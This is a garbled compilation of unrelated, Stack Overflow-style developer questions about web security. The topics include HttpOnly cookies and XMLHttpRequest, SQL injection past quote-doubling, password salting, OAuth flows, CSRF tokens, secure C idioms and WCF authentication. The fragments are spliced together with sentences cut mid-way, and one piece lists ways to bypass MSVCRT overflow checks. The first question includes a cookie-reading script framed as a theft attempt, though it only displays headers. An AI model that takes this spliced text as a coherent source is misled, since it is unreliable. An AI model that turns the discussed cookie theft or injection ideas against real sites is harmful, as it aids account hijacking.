<p><em>Edit:</em> Microsoft created a way to prevent XSS attacks by disallowing JavaScript access to cookies if HttpOnly is specified. FireFox later adopted this. So my question is: If you are using AJAX on a site, like StackOverflow, are Http-Only cookies an option?</p>

<p><em>Edit 2:</em> Question 2. If the purpose of HttpOnly is to prevent JavaScript access to cookies, and you can still retrieve the cookies via JavaScript through the XmlHttpRequest Object, <strong>what is the point of HttpOnly</strong>?</p>

<p><em>Edit 3:</em> Here is a quote from Wikipedia:</p>

<blockquote>
  <p>When the browser receives such a cookie, it is supposed to use it as usual in the following HTTP exchanges, but not to make it visible to client-side scripts.[32] The <code>HttpOnly</code> flag is not part of any standard, and is not implemented in all browsers. Note that there is currently no prevention of reading or writing the session cookie via a XMLHTTPRequest. [33].</p>
</blockquote>

<p>I understand that <code>document.cookie</code> is blocked when you use HttpOnly. But it seems that you can still read cookie values in the XMLHttpRequest object, allowing for XSS. How does HttpOnly make you any safer than? By making cookies essentially read only? </p>

<p>In your example, I cannot write to your <code>document.cookie</code>, but I can still steal your cookie and post it to my domain using the XMLHttpRequest object.</p>

<pre><code>&lt;script type=""text/javascript""&gt;
    var req = null;
    try { req = new XMLHttpRequest(); } catch(e) {}
    if (!req) try { req = new ActiveXObject(""Msxml2.XMLHTTP""); } catch(e) {}
    if (!req) try { req = new ActiveXObject(""Microsoft.XMLHTTP""); } catch(e) {}
    req.open('GET', 'http://stackoverflow.com/', false);
    req.send(null);
    alert(req.getAllResponseHeaders());
&lt;/script&gt;
</code></pre>

<p><em>Edit 4:</em> Sorry, I meant that you could send the XMLHttpRequest to the StackOverflow domain, and then save the result of getAllResponseHeaders() to a string, regex out the cookie, and then post that to an external domain. It appears that Wikipedia and ha.ckers concur with me on this one, but I would love be re-educated...</p>

<p><em>Final Edit:</em> Ahh, apparently both sites are wrong, this is actually a <a href=""https://bugzilla.mozilla.org/show_bug.cgi?id=380418"" rel=""noreferrer"">bug in FireFox</a>. IE6 &amp; 7 are actually the only browsers that currently fully support HttpOnly.</p>

<p>To reiterate everything I've learned:</p>

<ul>
<li>HttpOnly restricts all access to document.cookie in IE7 &amp; and FireFox (not sure about other browsers)</li>
<li>HttpOnly removes cookie information from the response headers in XMLHttpObject.getAllResponseHeaders() in IE7.</li>
<li>XMLHttpObjects may only be submitted to the domain they originated from, so there is no cross-domain posting of the cookies.</li>
</ul>

<p><code>Content-Disposition: attachment; filename=<em>FILENAME</em></code></p>

<p>The <code>filename</code> parameter can be used to suggest a name for the file into which the resource is downloaded by the browser. <a href=""http://tools.ietf.org/html/rfc2183"" rel=""noreferrer"">RFC 2183</a> (Content-Disposition), however, states in <a href=""http://tools.ietf.org/html/rfc2183#section-2.3"" rel=""noreferrer"">section 2.3</a> (The Filename Parameter) that the file name can only use US-ASCII characters:</p>

<blockquote>
  <p>Current [RFC 2045] grammar restricts
  parameter values (and hence
  Content-Disposition filenames) to
  US-ASCII.  We recognize the great
  desirability of allowing arbitrary
  character sets in filenames, but it is

  define the necessary mechanisms.</p>

<p>There is empirical evidence, nevertheless, that most popular Web browsers today seem to permit non-US-ASCII characters yet (for the lack of a standard) disagree on the encoding scheme and character set specification of the file name.

'CN = ""example.com""' against the actual URL that's being requested. This is probably deliberate, since our client app is required to talk to various environments, so after contacting an initial portal (eg. example.com/main) and the user choosing an environment the app gets redirected to a specific IP, so all future requests look something like ""<a href=""http://127.0.0.1/page"" rel=""noreferrer"">http://127.0.0.1/page</a>"".</p>

<p>However being an SSL newbie, I'm unsure of the implications of disabling this check. My first reaction would be that it'd be easier to perform some kind of man-in-the-middle attack, since someone else could just copy our certificate and pretend to be one of our servers. But if we were doing common name checking you'd be able to do the same thing with custom DNS settings anyway, so it doesn't seem to actually gain us anything. Are there other attacks that this leaves us open to which we wouldn't be otherwise?</p>

<p>Basically, the crux of the argument is whether we should support <code>CSV</code> at all because of the lack of recursion (<strong><em>i.e. having a document which has <code>multiple authors</code> and <code>multiple references</code> would require <code>multiple API calls</code> to obtain all the <code>information</code></em></strong>).</p>

  <p>We've decided to provide <code>XML</code> and <code>JSON</code> due to the difficulty in recursion in <code>CSV</code> needing multiple calls for a single logical operation. <code>JSON</code> doesn't have a parser in <code>Qt</code> and <code>Protocol Buffers</code> doesn't seem to have a <code>non-alpha PHP</code> implementation so they are out for the moment too but will probably be supported eventually.</p>

Here's the code:</p>

<pre><code>sSanitizedInput = ""'"" &amp; Replace(sInput, ""'"", ""''"") &amp; ""'""
</code></pre>

<p>Any single-quote the user enters is replaced with double single-quotes, which eliminates the users ability to end the string, so anything else they may type, such as semicolons, percent signs, etc., will all be part of the string and not actually executed as part of the command.  </p>

<p>We are using Microsoft SQL Server 2000, for which I believe the single-quote is the only string delimiter and the only way to escape the string delimiter, so there is no way to execute anything the user types in.</p>

<p>I don't see any way to launch an SQL injection attack against this, but I realize that if this were as bulletproof as it seems to me someone else would have thought of it already and it would be common practice.  </p>

<p>What's wrong with this code? Is there a way to get an SQL injection attack past this sanitization technique?  Sample user input that exploits this technique would be very helpful.</p>

<hr/>

<p>UPDATE:</p>

<p>I still don't know of any way to effectively launch a SQL injection attack against this code. A few people suggested that a backslash would escape one single-quote and leave the other to end the string so that the rest of the string would be executed as part of the SQL command, and I realize that this method would work to inject SQL into a MySQL database, but in SQL&nbsp;Server 2000 the only way (that I've been able to find) to escape a single-quote is with another single-quote; backslashes won't do it.</p>

<p>And unless there is a way to stop the escaping of the single-quote, none of the rest of the user input will be executed because it will all be taken as one contiguous string.</p>

<p>I understand that there are better ways to sanitize input, but I'm really more interested in learning why the method I provided above won't work. If anyone knows of any specific way to mount a SQL injection attack against this sanitization method I would love to see it.</p>

The service is hosted in a Windows Service process. Now, I'm trying to find out the best way to implement <em>authorization</em> for each service operation.</p>

<p>For example, consider the following method:</p>

<pre><code>public EntityInfo GetEntityInfo(string entityId);
</code></pre>

<p>As you may know, in WCF, there is an OperationContext object from which you can retrieve the security credentials passed in by the caller/client. Now,<em>authentication</em> would have already finished by the time the first line in the method is called. However, how do we implement authorization if the decision depends on the input data itself? For example, in the above case, say 'admin' users(whose permissions etc are stored in a database), are allowed to get entity info, and other users should not be allowed... where do we put the authorization checks?</p>

<p>Say we put it in the first line of the method like so:</p>

<pre><code>CheckAccessPermission(PermissionType.GetEntity, user, entityId) //user is pulled from the current OperationContext
</code></pre>

<p>Now, there are a couple of questions:</p>

<ol>
<li><p>Do we validate the entityId (for example check null / empty value etc) BEFORE the authorization check or INSIDE the authorization check? In other words, if authorization checks should be included in every method, is that a good pattern? Which should happen first - argument validation or authorization?</p></li>
<li><p>How do we unit test a WCF service when authorization checks are all over the place like this, and we don't have an OperationContext in the unit test!? (Assuming I'm tryin to test this service class implementation directly without any of the WCF setup).</p></li>
</ol>

<p>Any ideas guys?</p>

As far as I'm concerned this breaks the REST architecture because you're essentially tunneling an RPC call through POST instead of really operating on individual resources.</p>

<p><strong>I need to somehow query Google and ask: Is [given access token] valid for the [example@example.com] Google account?</strong></p>

<p><em>Short version</em>:<br />
It's clear how an access token supplied through the <a href=""http://code.google.com/apis/accounts/docs/OAuth.html"" rel=""noreferrer"">Google Authentication Api :: OAuth Authentication for Web Applications</a> can be used to then request data from a range of Google services. It is not clear how to check if a given access token is valid for a given Google account. I'd like to know how.</p>

<p><em>Long version</em>:<br />
I'm developing an API that uses token-based authentication. A token will be returned upon provision of a valid username+password or upon provision of a third-party token from any one of <i>N</i> verifiable services.</p>

<p>One of the third-party services will be Google, allowing a user to authenticate against my service using their Google account. This will later be extended to include Yahoo accounts, trusted OpenID providers and so on.</p>

<p><strong>Schematic example of Google-based access:</strong></p>

<p><a href=""http://webignition.net/images/figures/auth_figure002.png"" rel=""noreferrer"">alt text http://webignition.net/images/figures/auth_figure002.png</a></p>

<p>The 'API' entity is under my full control. The 'public interface' entity is any web- or desktop-based app. Some public interfaces are under my control, others will not be and others still I may never even know about.</p>

<p>Therefore I cannot trust the token supplied to the API in step 3. This will be supplied along with the corresponding Google account email address.</p>

<p>I need to somehow query Google and ask: <em>Is this access token valid for example@example.com</em>?</p>

<p>In this case, example@example.com is the Google account unique identifier - the email address someone uses to log in to their Google account. This cannot be assumed to be a Gmail address - someone can have a Google account without having a Gmail account.</p>

<p>The Google documentation clearly states how, with an access token, data can be retrieved from a number of Google services. Nothing seems to state how you can check if a given access token is valid in the first place.</p>

<p><strong>Update</strong>
The token is valid for N Google services. I can't try a token against a Google service as means of verifying it as I won't know which subset of all Google's services a given user actually uses.</p>

<p>Furthermore, I'll never be using the Google authentication access token to access any Google services, merely as a means of verifying a supposed Google user actually is who they say they are. If there is another way of doing this I'm happy to try.</p>

Now I hoped when I create a specific GSSCredential object for my service, the service ticket will be put into the Subject's private credentials as well (I've read so somewhere in the web).

It's my understanding that the primary use is to hamper a rainbow table attack.  However, the methods I've seen to implement this don't seem to really make the problem harder.</p>

<p>I've seen many tutorials suggesting that the salt be used as the following:</p>

<pre><code>$hash =  md5($salt.$password)
</code></pre>

<p>The reasoning being that the hash now maps not to the original password, but a combination of the password and the salt.  But say <code>$salt=foo</code> and <code>$password=bar</code> and <code>$hash=3858f62230ac3c915f300c664312c63f</code>.  Now somebody with a rainbow table could reverse the hash and come up with the input ""foobar"".  They could then try all combinations of passwords (f, fo, foo, ... oobar, obar, bar, ar, ar).  It might take a few more milliseconds to get the password, but not much else.</p>

<p>The other use I've seen is on my linux system.  In the /etc/shadow the hashed passwords are actually stored <em>with</em> the salt.  For example, a salt of ""foo"" and password of ""bar"" would hash to this: <code>$1$foo$te5SBM.7C25fFDu6bIRbX1</code>.  If a hacker somehow were able to get his hands on this file, I don't see what purpose the salt serves, since the reverse hash of <code>te5SBM.7C25fFDu6bIRbX</code> is known to contain ""foo"".</p>

<p>Thanks for any light anybody can shed on this.</p>

<p><strong>EDIT</strong>:  Thanks for the help.  To summarize what I understand, the salt makes the hashed password more complex, thus making it much less likely to exist in a precomputed rainbow table.  What I misunderstood before was that I was assuming a rainbow table existed for ALL hashes.</p>

<p>To explain: We all (hopefully) know by now that we should <a href=""http://en.wikipedia.org/wiki/Salt_(cryptography)"" rel=""noreferrer"">salt</a> a password before we hash it for storage in the database [<strong>Edit:</strong> So you can avoid things like <a href=""http://blog.codinghorror.com/i-just-logged-in-as-you-how-it-happened/"" rel=""noreferrer"">what happened to Jeff Atwood recently</a>]. Typically this is done by concatenating the salt with the password before passing it through the hashing algorithm. But the examples vary... Some examples prepend the salt before the password. Some examples add the salt <em>after</em> the password. I've even seen some that try to put the salt in the middle. </p>

<p>So which is the better method, and why? Is there a method that decreases the chance of a hash collision? My Googling hasn't turned up a decent analysis on the subject. </p>

Some of our customers have asked us to support LDAP integration for authenticating user accounts against their existing systems instead of having to create another login account for each of their employees. Seems like this is referred to as Single Sign On (SSO) in many places? Naturally our system already has a mechanism for maintaining user account profiles and authenticating those user accounts from our login page.</p>

<p>We're a bit ignorant about LDAP and are confused about a few things. Please excuse the possible use of wrong terminology (remember, we're a little ignorant about this).</p>

<p>We think we understand the basics of how this might work:</p>

<ul>
<li>Our customer configures their account to ""turn on"" the ""remote authentication"" feature for their account. They provide the remote URL that will authenticate their users.</li>
<li>Users come to our login page and attempt a login using their username and password provided by their company's LDAP system.</li>
<li>Our login page will securely forward the login credentials (presumably encrypted and hashed in some agreed upon format) to the ""remote authentication"" URL provided by our customer.</li>
<li>The customer's script will authenticate the user and then redirect them back to our site with the ""authentication status"".</li>
<li>Our page will analyze the ""authentication status"" and either accept the user as logged in or not.</li>
</ul>

<p>Assuming the above information is even semi-correct, we'll still need each user to have an account in our system. Won't we need some way to synchronize our user account profiles with the user profiles in the LDAP directory? Is this simply an ""external ID"" that references the user's ID in the LDAP system? Would it then be required that the customer's ""remote authentication"" script must provide that ID to our system so we know which user account in our system to associate the login with?</p>

<p>What are we missing?</p>

<p>BTW, our platform is IIS, ASP.Net 2.0, and SQL Server 2005.</p>

Most clients are domain accounts and connect to the service using their default credentials.</p>

<p>Now I want to connect to the service from an ASP.NET client that is running under a local account.  I want to connect to the WCF service using windows credentials (domain\user and password) that are available to the ASP.NET application.</p>

<p>I know I can do this in code using ClientBase&lt;T>.ClientCredentials.</p>

<p>Is there a way to specify the credentials (domain\user and password) in the client's web.config file so I don't have to change the code?</p>

<p><strong>EDIT</strong></p>

<p>If it can't be done in the configuration file, is there a way of using System.Net.ICredentials or System.Net.NetworkCredential as a credential for a WCF service?</p>

<p>The .NET Framework provides these as a homogenous way to provide network credentials, but with WCF this seems to have been thrown out in favour of a new incompatible system based on the unrelated System.ServiceModel.Description.ClientCredentials class.</p>

<p><strong>EDIT 2</strong></p>

<p>Accepting Marc's answer to the original question - it seems there is no way to do this in the client configuration file :(</p>

<p>I would see this as a deficiency in WCF - I don't accept that Microsoft should be deliberately discouraging us from putting credentials in the configuration file - after all they have to be stored somewhere, and the Framework includes facilities for encrypting the config file.  I guess I could create a custom BehaviorExtensionElement for this, but it ought to be available out of the box.</p>

<p>It's also a bit inconsistent: the system.net/mailSettings/smtp/network configuration element allows credentials to be specified, so why not WCF?</p>

<p>Regarding the second question about using System.Net.NetworkCredential, it seems from <a href=""http://devdump.wordpress.com/tag/wcf/"" rel=""noreferrer"">this blog</a> that it is possible, at least when using Windows authentication, with the following code:</p>

<p>To create the hash value stored in the DBMS, take:</p>

<ul>
<li>A value that is unique to the DBMS server instance as part of the salt,</li>
<li>And the username as a second part of the salt,</li>
<li>And create the concatenation of the salt with the actual password,</li>
<li>And hash the whole string using the SHA-256 algorithm,</li>
<li>And store the result in the DBMS.</li>
</ul>

<p>This would mean that anyone wanting to come up with a collision should have to do the work separately for each user name and each DBMS server instance separately.  I'd plan to keep the actual hash mechanism somewhat flexible to allow for the use of the new <a href=""http://www.schneier.com/blog/archives/2009/07/sha-3_second_ro.html"" rel=""nofollow noreferrer"">NIST</a> standard hash algorithm (<a href=""http://csrc.nist.gov/groups/ST/hash/sha-3/index.html"" rel=""nofollow noreferrer"">SHA-3</a>) that is still being worked on.</p>

<p>The 'value that is unique to the DBMS server instance' need not be secret - though it wouldn't be divulged casually.  The intention is to ensure that if someone uses the same password in different DBMS server instances, the recorded hashes would be different. Likewise, the user name would not be secret - just the password proper.</p>

<p>Would there be any advantage to having the password first and the user name and 'unique value' second, or any other permutation of the three sources of data?  Or what about interleaving the strings?</p>

<p>Do I need to add (and record) a random salt value (per password) as well as the information above?  (Advantage: the user can re-use a password and still, probably, get a different hash recorded in the database.  Disadvantage: the salt has to be recorded.  I suspect the advantage considerably outweighs the disadvantage.)</p>

<p>We have clientMachine > webServer > databaseServer. The client is insistent that the site must pull the windows login and not prompt, hence the need for Kerberos and Integrated Authentication. It also MUST impersonate the user onto the db server, inducing a double-hop. </p>

<p>Our domain is a Windows 2003 domain, which as far as I can tell online, means Kerberos is enabled. And on a domain-joined computer,when logged in, kerbtray shows me I have a slew of tickets, so it is apparently working. </p>

<p>The web and database server computer accounts in AD are both ""trusted for delegation"".<br>
The AD user accounts which must access the system are both ""trusted for delegation"".<br>
When it is all working, I will add more users, for now two is it. </p>

<p>The Sql Server instance is running under LocalSystem on the database server, which as near as i can tell online, means it does NOT require messing with those SPN things at all.  </p>

<p>Yet, when i try to log in with either user, i get</p>

<pre><code>Login failed for user 'NT AUTHORITY\ANONYMOUS LOGON'. 
</code></pre>

<p>indicating a double-hop failure. This is furthered by the fact that in the application log on the db server there are a slew of entries from ""MSSQL"" saying the same thing. </p>

<p>I really can't believe how hard this is... i mean, IIS, SQL and Windows are all Microsoft, can't they talk better??? </p>

<p>So in summary, i have <ul>
<li>a kerberos domain,<br>
<li>db and web server both trusted for delegation<br>
<li>users trusted for delegation<br>
<li>users in a AD group<br>
<li>AD group as a login in sql (and user in db)<br>
<li>IIS with Anonymous off, Integrated on, Basic and Digest off
<li>IE with Enable Integrated on

<ul>
<li>a registry key to prevent MSVCRT from halting execution</li>
<li>running the application in compability with a previous operating system (previous to Windows 7)</li>
<li>adding an assembly manifest to the executable folder so that it uses an older version of the MSVCRT, one which doesn't perform this overflow checking</li>
<li>a version number, or download location, of a copy of MSVCRT that doesn't have the overflow checking</li>

<p>I am attempting to write very secure C. Below I list some of the techniques I use and ask are they as secure as I think they are. Please don't not hesitate to tear my code/preconceptions to shreds. Any answer that finds even the most trivial vulnerability or teaches me a new idea will be <em>highly valued</em>.</p>

<h1>Reading from a stream:</h1>

<p>According to the <a href=""http://crasseux.com/books/ctutorial/getline.html"" rel=""nofollow noreferrer"">GNU C Programming Tutorial</a> getline:</p>

<blockquote>
  <p>The getline function will
  automatically enlarge the block of
  memory as needed, via the realloc
  function, so there is never a shortage
  of space -- one reason why getline is
  so safe. [..] Notice that getline can 
  safely handle your line of input, no 
  matter how long it is. </p>
</blockquote>

<p>I assume that getline should, <strong>under all inputs</strong>, prevent a <a href=""http://en.wikipedia.org/wiki/Buffer_overflow"" rel=""nofollow noreferrer"">buffer overflow</a> from occurring when reading from a stream.</p>

<ul>
<li>Is my assumption correct? Are there inputs and/or allocation schemes under which this could lead to an exploit? For instance what if the first character from the stream is some <a href=""http:///seq/annotation/workspaces/heilman/gff2/f11/M73LQ_4.gff2"" rel=""nofollow noreferrer"">bizarre control character</a>, maybe 0x08 BACKSPACE (ctl-H).</li>
<li>Has any work been done to mathematically prove getline as secure?</li>
</ul>

<h1>Malloc Returns Null on Failure:</h1>

<p>If malloc encounters an error malloc returns a NULL pointer. This presents a security risk since one can still apply pointer arithmetic to a NULL (0x0) pointer, thus wikipedia <a href=""http://en.wikipedia.org/wiki/Malloc#Usage_example"" rel=""nofollow noreferrer"">recommends</a></p>

<pre><code>/* Allocate space for an array with ten elements of type int. */
int *ptr = (int*)malloc(10 * sizeof (int));
if (ptr == NULL) {
    /* Memory could not be allocated, the program should handle 
       the error here as appropriate. */
} 
</code></pre>

<h1>Secure sscanf:</h1>

<p>When using <a href=""http://crasseux.com/books/ctutorial/sscanf.html"" rel=""nofollow noreferrer"">sscanf</a> I've gotten in the habit of allocating the size to-be-extracted strings to the size of the input string hopefully avoiding the possibility of an overrun. For example:</p>

<pre><code>const char *inputStr = ""a01234b4567c"";
const char *formatStr = ""a%[0-9]b%[0-9]c"":
char *str1[strlen(inputStr)];
char *str2[strlen(inputStr)];

sscanf(inputStr, formatStr, str1, str2);
</code></pre>

<p>Because str1 and str2 are the size of the inputStr and no more characters than strlen(inputStr) can be read from inputStr, it seems impossible, given <strong>all possible values</strong> for the inputStr to cause a buffer overflow?</p>

<ul>
<li>Am I correct? Are there strange corner cases I haven't thought of?</li>
<li>Are there better ways to write this? Libraries that have already solved it?</li>
</ul>

<h1>General Questions:</h1>

<p>While I've posted a large number of questions I don't expect anyone to answer all of them. The questions are more of guideline to the sorts of answers I am looking for. I really want to learn the secure C mindset.</p>

<ul>
<li>What other secure C idioms are out there?</li>
<li>What corner cases do I need to <strong>always check</strong>?</li>
<li>How can I write unit tests to enforce these rules?</li>
<li>How can I enforce constraints in a testability or provably correct way?</li>
<li>Any recommended static/dynamic analysis technics or tools for C? </li>
<li>What secure C practices do you follow and how do you justify them to yourself and others?</li>
</ul>

<p><strong>Original post</strong>:</p>

<p>I want my node.js server to run in the background, i.e.: when I close my terminal I want my server to keep running. I've googled this and came up with this <a href=""http://kevin.vanzonneveld.net/techblog/article/run_nodejs_as_a_service_on_ubuntu_karmic/"" rel=""noreferrer"">tutorial</a>, however it doesn't work as intended. So instead of using that daemon script, I thought I just used the output redirection (the <code>2&gt;&amp;1 &gt;&gt; file</code> part), but this too does not exit - I get a blank line in my terminal, like it's waiting for output/errors.</p>

<p>I've also tried to put the process in the background, but as soon as I close my terminal the process is killed as well.</p>

<p>So how can I leave it running when I shut down my local computer?</p>

<p>Currently, I just detect that there was an error trying to get the user's information with their access token, then redirect to the authorization URL again -- since they already authorized the app a blank page flashes by and they are redirected back to my app callback where I get a fresh token.

The <a href=""http://tools.ietf.org/html/draft-ietf-oauth-v2-16"">current draft</a> (v2-16 from May 19th) describes <a href=""http://tools.ietf.org/html/draft-ietf-oauth-v2-16#section-4"">four grant types</a>. They are mechanisms or flows for obtaining authorization (an access token).  </p>

<ol>
<li>Authorization Code</li>
<li>Implicit Grant</li>
<li>Resource Owner Credentials</li>
<li>Client Credentials</li>
</ol>

<p>It seems we need to support all four of them, since they serve different purposes. The first two (and possibly the last one) can be used from third-party apps that need access to the API. The authorization code is the standard way to authorize a web application that is lucky enough to reside on a secure server, while the implicit grant flow would be the choice for a client application that can’t quite keep its credentials confidential (e.g. mobile/desktop application, JavaScript client, etc.).<br>
We want to use the third mechanism ourselves to provide a better user experience on mobile devices – instead of taking the user to a login dialog in a web browser and so on, the user will simply enter his or her username and password directly in the application and login.
We also want to use the Client Credentials grant type to obtain an access token that can be used to view public data, not associated with any user. In this case this is not so much authorization, but rather something similar to an API key that we use to give access only to applications that have registered with us, giving us an option to revoke access if needed.  </p>

<p>So my questions are:</p>

<ol>
<li>Do you think I have understood the purpose of the different grant types correctly?</li>
<li>How can you keep your client credentials confidential? In both the third and fourth case, we need to have the client id and client secret somewhere on the client, which doesn't sound like a good idea.</li>
<li>Even if you use the implicit grant type and you don’t expose your client secret, what stops another application from impersonating your app using the same authorization mechanism and your client id?</li>
</ol>

<p>To summarize, we want to be able to use the client credentials and resource owner credentials flow from a client application. Both of these flows require you to store the client secret somehow, but the client is a mobile or JavaScript application, so these could easily be stolen.</p>

<pre>http://www.mysite.com/oauth_callback?foo=bar</pre>

<p>I'd like the redirect URL for a specific request be something like this, so that on the server, I have some context about how to process the auth code:</p>

<pre>http://www.mysite.com/oauth_callback?foo=bar&user=6234</pre>

<p>My redirect gets invoked after the authorization dialog is submitted, and I get back an auth code, but when I try to get my access token, I'm getting an OAuthException error back from Facebook.  My request looks like this (line breaks added for clarity):</p>

<pre>
https://graph.facebook.com/oauth/access_token
    ?client_id=MY_CLIENT_ID
    &redirect_uri=http%3A%2F%2Fwww.mysite.com%2Foauth_callback%3Ffoo%3Dbar%26user%3D6234

<p>All of my parameters are URL-encoded, and the code looks valid, so my only guess is that the problem parameter is my redirect_uri.  I've tried setting <code>redirect_uri</code> to all of the following, to no avail:</p>

<ol>
<li>The actual URL of the request to my site</li>
<li>The URL of the request to my site, minus the <code>code</code> parameter</li>
<li>The URL specified in my Facebook application's configuration</li>

<p>Are custom redirect URI parameters supported?  If so, am I specifying them correctly?  If not, will I be forced to set a cookie, or is there some better pattern for supplying context to my web site?</p>

<p>I have an architectural question:</p>

<p>After successful authorization in Google I'll receive accessToken from Google OAuth2 Authorization server.

<p>In other words - is it safe to show accessToken from Google to my client AngularJS app and use it for an authentication in my own RESTful API?</p>

<p>Usually I'd like to generate a token based off of a unique piece of data associated with the user's session, and hashed and salted with a secret key.</p>

<p>My question is in regards to generating tokens when there is NO unique user data to use. No sessions are available, cookies are not an option, IP address and things of that nature are not reliable.</p>

<p>Is there any reason why I cannot include the string to hash as part of the request as well?
Example pseudocode to generate the token and embed it:</p>

<pre><code>var $stringToHash = random()
var $csrfToken = hash($stringToHash + $mySecretKey)
&lt;a href=""http://foo.com?csrfToken={$csrfToken}&amp;key={$stringToHash}""&gt;click me&lt;/a&gt;
</code></pre>

<p>Example server-side validation of the CSRF token</p>

<pre><code>var $stringToHash = request.get('key')
var $isValidToken = hash($stringToHash + $mySecrtKey) == request.get('csrfToken')
</code></pre>

<p>The string being used in the hash would be different on each request. As long as it was included in each request, the CSRF token validation could proceed. Since it is new on each request and only embedded in the page, outside access to the token would not be available. Security of the token then falls to the $mySecretKey being known only to me.</p>

<p>Is this a naive approach? Am I missing some reason why this cannot work?</p>

<p>Thanks</p>

<pre><code>&lt;configuration&gt;
  &lt;uri&gt;
  &lt;idn enabled=""All"" /&gt;
  &lt;iriParsing enabled=""true"" /&gt;
  &lt;/uri&gt;
&lt;/configuration&gt;
</code></pre>

<p>But whether this is present in the .config file or not, I'm getting the same (non-3986) escaping behavior for a .NET 3.5 SP1 app.  <strong>What else do I need to do to get <code>Uri.EscapeDataString</code> to use the RFC 3986 rules?</strong> (specifically, to escape the reserved characters as defined in that RFC)</p>

Because of that, I am concerned about the integrity of the message being maintained between the time I send it, and the time that I receive it back.</p>

<p>It should be assumed that once I send the message to myself, no information about the message sent will be available to me in the future.  The message is completely self-contained.</p>

<p>To that end, I know that should hash the message contents and compare the hashes before I send the message, and after I send the message, if they differ, then the message has been tampered with.</p>

<p>Of course, if the man-in-the-middle knows that the hash is really just the hash of the message contents, as-is, then because the message is self-contained, he can just create new contents and apply the same hash algorithm to the contents.</p>

<p>The question is, to what lengths should I go to randomize the message contents when generating the hash?  When does it reach the point of diminishing returns?</p>

<p>In this scenario, I have a set of key/value pairs.  To that end, the steps that I know I HAVE to take are:</p>

<ol>
<li>Add a salt to the message.  The salt is a secret to the rest of the world.  It gets attached to the contents of the message before hashing.</li>
<li>Order the key/value pairs in a consistent manner before generating the hash.</li>
<li>While not <em>directly</em> relevant, a timestamp is going to be added to the contents of each message before hashing, to prevent replay attacks.</li>
</ol>

<p>These are the optional steps that I am considering:</p>

<ol>
<li>Transforming the keys before I order them.  I've considered reversing them, then ordering by count/key.</li>
<li>Playing with the separators that separate key/value pairs (both for the separator for the key/value and the separator for the pair).</li>
</ol>

<p><strong>NOTE</strong></p>

<p>Message privacy is <strong>not</strong> a requirement here, so I am not looking for encryption.  The values <em>must</em> be transmitted in plain-text.</p>

<p>Finally, what hashing algorithms should I avoid?</p>

<hr>

<p><strong>Specifics</strong></p>

<p>I have an ASP.NET MVC site which I have a controller which handles input validation and persistence.</p>

<p>If (based on a heuristic, it's not important which) the input is determined to be an automated spam attempt, a model of <code>IDictionary&lt;string, string&gt;</code> is created with the input values and a ViewResult is sent to a general CAPTCHA page.</p>

<p>In that view, in the form that contains the CAPTCHA control, the contents of the <code>IDictionary&lt;string, string&gt;</code> will be written out in hidden input fields, and the action of the form will be the same action that the contents were originally posted to.  This way, MVC can pick up the values when the form is resubmitted.</p>

<p>It's because of this I can't encrypt the key/value pairs (or maybe I can and should, tell me why and how!).</p>

<p>Of course, I need to add one more value, which contains the hashed message contents.  If that value is there, then the controller will check to see that the message integrity is maintained, and allow the input to be persisted if it has.</p>

<p><strong>Solution</strong></p>

<p>I've opted to go with the SignedCms class in the System.Security.Cyrptography.Pkcs namespace, which represents the signging and verifying of CMS/PKCS #7 messages.</p>

<p>To elaborate, I've created a self-issued certificate with MAKECERT.EXE and then in my code, I use the example here to digitally sign the data:</p>

<p><a href=""http://blogs.msdn.com/shawnfa/archive/2006/02/27/539990.aspx"" rel=""nofollow noreferrer"">http://blogs.msdn.com/shawnfa/archive/2006/02/27/539990.aspx</a></p>

<p>Now, it should be a matter of keeping the password on the exported private key secure, as well as security on the server, which makes it less about programming.</p>

<p>I'll have to add an extra key for the timestamp for replay attacks, but that won't be too hard.</p>

<p>The salt would make it harder for an attacker to hijack or whatever the session. But WHY add a salt every time you would check it like this:</p>

<p>So WHY would a salt make it more secure, since the attacker still only needs the useragent (which is relativly a small set of different useragents) and the sessionid?</p>

<p>I worked through<a href=""http://msdn.microsoft.com/en-us/library/ms730868.aspx"" rel=""noreferrer"">this MSDN article</a>, but I'm missing something because it doesn't work.</p>

<p>First, I have some custom ClientCredentials that provide a custom ClientCredentialsSecurityTokenManager:</p>

<pre><code>public class CentralAuthCredentials : ClientCredentials
{
    public override System.IdentityModel.Selectors.SecurityTokenManager CreateSecurityTokenManager()
    {
        return new CentralAuthTokenManager(this);
    }
}

public class CentralAuthTokenManager : ClientCredentialsSecurityTokenManager
{
    private CentralAuthCredentials credentials;

    public CentralAuthTokenManager(CentralAuthCredentials creds) : base(creds)
    {
        this.credentials = creds;
    }

    public override SecurityTokenProvider CreateSecurityTokenProvider(SecurityTokenRequirement tokenRequirement)
    {
        if (this.IsIssuedSecurityTokenRequirement(tokenRequirement) || tokenRequirement.TokenType == CentralAuthToken.TOKEN_TYPE)
            return new CentralAuthTokenProvider(credentials.UserId, credentials.UserPassword, credentials.ImpersonateId, credentials.LoginType);
        else
            return base.CreateSecurityTokenProvider(tokenRequirement);
    }

    public override SecurityTokenAuthenticator CreateSecurityTokenAuthenticator(SecurityTokenRequirement tokenRequirement, out SecurityTokenResolver outOfBandTokenResolver)
    {
        outOfBandTokenResolver = null;
        if (this.IsIssuedSecurityTokenRequirement(tokenRequirement) || tokenRequirement.TokenType == CentralAuthToken.TOKEN_TYPE)
            return new CentralAuthTokenAuthenticator();
        else
            return base.CreateSecurityTokenAuthenticator(tokenRequirement, out outOfBandTokenResolver);
    }

    public override SecurityTokenSerializer CreateSecurityTokenSerializer(SecurityTokenVersion version)
    {
        return new CentralAuthTokenSerializer();
    }
}
</code></pre>

<p>Now when I run the app, my custom credentials and token manager do get created.
However, in the method:</p>

<pre><code>CreateSecurityTokenProvider(SecurityTokenRequirement tokenRequirement)
{
    ...
}
</code></pre>

<p>The tokenRequirement.TokenType comes across as something other than my custom token. That brings up my <strong>1st question</strong>: How the heck does WCF know what the token requirements are?</p>

<p>Also, the method:</p>

<pre><code>public override SecurityTokenSerializer CreateSecurityTokenSerializer(SecurityTokenVersion version)
{
    return new CentralAuthTokenSerializer();
}
</code></pre>

<p>Does get called once by the client, but none of the methods on the returned token serializer are ever called. This indicates to me that the custom token is never being sent across the wire. I assume this is because the call to CreateSecurityTokenProvider() never returned my custom token provider, since the SecurityTokenRequirement is never passed in indicating my custom token is needed.</p>

<p>On the client side, I have:</p>

<pre><code>public class CentralAuthorizationManagerClient : ClientBase&lt;ICentralAuthorizationManager&gt;, ICentralAuthorizationManager, IDisposable
{
    public PFPrincipal GenerateToken()
    {
        if (!this.ChannelFactory.Endpoint.Behaviors.Contains(typeof(CentralAuthCredentials)))
            throw new ArgumentException(""Must set CentralAuthCredentials before calling this method."");
